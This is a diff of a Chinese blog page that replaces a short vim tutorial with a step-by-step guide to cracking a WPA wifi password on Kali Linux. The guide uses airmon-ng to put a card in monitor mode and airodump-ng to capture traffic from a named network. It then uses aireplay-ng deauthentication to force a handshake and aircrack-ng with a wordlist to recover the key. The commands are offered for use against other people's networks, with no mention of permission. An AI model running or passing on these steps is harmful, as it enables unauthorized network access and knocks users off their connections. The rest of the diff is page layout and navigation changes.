@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="vim, blog,haclmker,hacking">
+    <meta name="keywords" content="暴力破解wifi密码, blog,haclmker,hacking">
     <meta name="description" content="you need learn hacking ">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>vim | haclmker</title>
+    <title>暴力破解wifi密码 | haclmker</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -251,12 +251,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/images/pasted-22.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/images/pasted-30.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">vim</h1>
+                    <h1 class="description center-align post-title">暴力破解wifi密码</h1>
                 </div>
             </div>
         </div>
@@ -372,8 +372,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E7%BC%96%E8%BE%91%E5%99%A8/">
-                                <span class="chip bg-color">编辑器</span>
+                            <a href="/tags/%E5%AF%86%E7%A0%81%E5%AE%89%E5%85%A8-%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/">
+                                <span class="chip bg-color">密码安全&amp;网络渗透</span>
                             </a>
                         
                     </div>
@@ -388,10 +388,6 @@
                                 kali linux
                             </a>
                         
-                            <a href="/categories/kali-linux/linux/" class="post-category">
-                                linux
-                            </a>
-                        
                     </div>
                     
                 </div>
@@ -401,7 +397,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-09-04
+                    2022-01-15
                 </div>
                 
 
@@ -410,7 +406,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    328
+                    501
                 </div>
                 
 
@@ -437,15 +433,41 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h1><h2 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h2><p>vim是什么？vim是古老的编辑器。那vim都很古老了为什么要来介绍？你要记住vim编辑器很强！</p>
-<h2 id="安装："><a href="#安装：" class="headerlink" title="安装："></a>安装：</h2><p>一般linux都自带vim编辑器，如果你的linux没有安装那就安装一下。</p>
-<pre><code>sudo apt-get install vim</code></pre>
-<h2 id="使用："><a href="#使用：" class="headerlink" title="使用："></a>使用：</h2><h3 id="编辑一个文件："><a href="#编辑一个文件：" class="headerlink" title="编辑一个文件："></a>编辑一个文件：</h3><p>以a.c为例子</p>
-<pre><code>vim a.c</code></pre>
-<h3 id="键盘技巧："><a href="#键盘技巧：" class="headerlink" title="键盘技巧："></a>键盘技巧：</h3><p><img src="/images/pasted-21.png" alt="upload successful"><br>使用这些快捷键是在普通模式下，并不是在输入模式下。退出输入模式按键盘左上角的Esc键。</p>
-<h3 id="“-”用法："><a href="#“-”用法：" class="headerlink" title="“:”用法："></a>“:”用法：</h3><p>保存：在普通模式输入英文的这个符号”:” ，再输入w。最后回车。(:w)<br><br>退出：在普通模式输入英文的这个符号”:”,在输入q。最后回车。(:q)<br><br>保存并退出：跟上面差不多，可以缩写。(:wq)<br><br>移动行数：在普通模式输入英文的这个符号”:”,在输入行数。最后回车。(以移动到行数1位例子:1)<br></p>
-<h3 id="查找字符："><a href="#查找字符：" class="headerlink" title="查找字符："></a>查找字符：</h3><p>在普通模式输入英文的这个符号”?”,再输入要查找的字符。最后回车。(以查找include为例子?include)</p>
-<h2 id="结言："><a href="#结言：" class="headerlink" title="结言："></a>结言：</h2><p>vim的功能和强大之处还有很多，本期就介绍这么多。<br>如果你喜欢我博文的话，就订阅我的srr吧！欢迎打赏，请作者喝一杯冰可乐吧！</p>
+                <h1 id="破解wifi密码"><a href="#破解wifi密码" class="headerlink" title="破解wifi密码"></a>破解wifi密码</h1><h2 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h2><p><b>本次破解wifi的方法是暴力破解也称为穷举法，将密码字典中每一个密码依次去与握手包中的密码进行匹配，直到匹配成功。</b></p>
+<h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><p><b>kali linux </b></p>
+<h2 id="start"><a href="#start" class="headerlink" title="start"></a>start</h2><ul>
+<li> 准备一个支持混合监听并支持该系统的网卡</li>
+<li> 准备一个kali linux的虚拟机或实体机  </li>
+</ul>
+<p>插上网卡并打开终端输入<br>  <pre><code>sudo su</code></pre><br>  来获得root权限为下面破解wifi做准备  </p>
+<p>  输入airmon-ng来查看网卡是否支持<br>  <pre><code>airmon-ng</code></pre></p>
+<p>  如下图所示即可<br>  <br> <img src="/images/pasted-23.png" alt="filename already exists, renamed"></p>
+<p> 使用airmon-ng start wlan0命令开启网卡监听<br> <pre><code>airmon-ng start wlan0</code></pre><br> 再使用iwoconfig命令查看是否处在监听模式</p>
+<p><img src="/images/pasted-24.png" alt="filename already exists, renamed"><br>当wlan0变成wlan0mon即可</p>
+<p> 输入如下命令开始对周围的wifi进行监听<br> <pre><code>airodump-ng wlan0mon</code></pre></p>
+<p><img src="/images/pasted-25.png" alt="filename already exists, renamed"><br>接下来抓包选中的wifi<br>在这之前先介绍一下一些名称：<br>BSSID为MAC地址，PWR为信号强度（越小信号越强）CH为信道</p>
+<p>使用以下命令进行对WiFi: TP-LINK_7974   进行抓包</p>
+<pre><code>airodump-ng -c 11 -w /home/haclmker/wifi/out.cap
+ --bssid 58:41:20:58:79:74  wlan0mon</code></pre>
+
+<p><img src="/images/pasted-26.png" alt="filename already exists, renamed"><br><b>解释命令参数</b>：-c 后面跟的是wifi的信道 –bssid 后面跟的是wifi的BSSID Mac地址 -w 后面跟的是捕获包的文件名及其路径</p>
+<p>新建一个终端并输入以下命令来攻击该wifi</p>
+<pre><code>aireplay-ng -0 11 -a 58:41:20:58:79:74 wlan0mon</code>
+</pre>
+
+
+<p><img src="/images/pasted-27.png" alt="filename already exists, renamed"></p>
+<p>之后返回之前的终端</p>
+<p><img src="/images/pasted-28.png" alt="filename already exists, renamed"></p>
+<p>返回WPA handshake: 58:41:20:58:79:74   即为成功</p>
+<p>接下来进入之前存储包的路径</p>
+<p>在终端输入以下命令对包进行破解</p>
+<pre><code>aircrack-ng -w /root/haclmker/wifi/password.txt /root/haclmker/wifi/out.cap</code></pre>
+
+<p><b>命令解释</b>:-w 字典路径 握手包路径</p>
+<p><img src="/images/pasted-29.png" alt="filename already exists, renamed"><br>这样就被破解出来了，密码是12345678</p>
+<p><b>暴力破解需要一个强大的字典!</b></p>
+<h2 id="结言"><a href="#结言" class="headerlink" title="结言"></a>结言</h2><p>教程制作不易。如果你喜欢我博文的话，就订阅我的srr吧！欢迎打赏，请作者喝一杯冰可乐吧！</p>
 
                 
             </div>
@@ -472,7 +494,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/090426382.html">http://example.com/2021/090426382.html</a>
+                    <a href="http://example.com/2022/011532775.html">http://example.com/2022/011532775.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -510,8 +532,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E7%BC%96%E8%BE%91%E5%99%A8/">
-                                    <span class="chip bg-color">编辑器</span>
+                                <a href="/tags/%E5%AF%86%E7%A0%81%E5%AE%89%E5%85%A8-%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/">
+                                    <span class="chip bg-color">密码安全&amp;网络渗透</span>
                                 </a>
                             
                         </div>
@@ -683,9 +705,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2022/011532775.html">
                     <div class="card-image">
@@ -702,9 +725,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-01-15
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-15
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -717,6 +740,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -735,12 +759,12 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/082618155.html">
+                <a href="/2021/090426382.html">
                     <div class="card-image">
                         
-                        <img src="/images/pasted-20.png" class="responsive-img" alt="Honeypot">
+                        <img src="/images/pasted-22.png" class="responsive-img" alt="vim">
                         
-                        <span class="card-title">Honeypot</span>
+                        <span class="card-title">vim</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -751,7 +775,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-26
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-09-04
                             </span>
                         <span class="publish-author">
                             
@@ -761,6 +785,10 @@
                                     kali linux
                                 </a>
                             
+                            <a href="/categories/kali-linux/linux/" class="post-category">
+                                    linux
+                                </a>
+                            
                             
                         </span>
                     </div>
@@ -768,12 +796,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/">
-                        <span class="chip bg-color">网络渗透</span>
-                    </a>
-                    
-                    <a href="/tags/pentbox/">
-                        <span class="chip bg-color">pentbox</span>
+                    <a href="/tags/%E7%BC%96%E8%BE%91%E5%99%A8/">
+                        <span class="chip bg-color">编辑器</span>
                     </a>
                     
                 </div>
